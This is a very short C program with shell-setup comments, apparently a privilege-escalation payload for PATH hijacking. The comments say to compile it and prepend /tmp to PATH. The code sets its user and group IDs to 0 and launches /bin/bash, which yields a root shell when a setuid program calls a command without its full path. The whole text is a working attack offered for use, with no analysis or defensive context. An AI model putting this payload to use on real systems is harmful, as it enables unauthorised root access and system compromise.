/* echo this into a file.c */
/* compile this gcc file.c -o filename */
/* export PATH=/tmp:$PATH -- to change your path, validate with 'env' */

int main () { setgid(0); setuid(0); system("/bin/bash"); return 0;}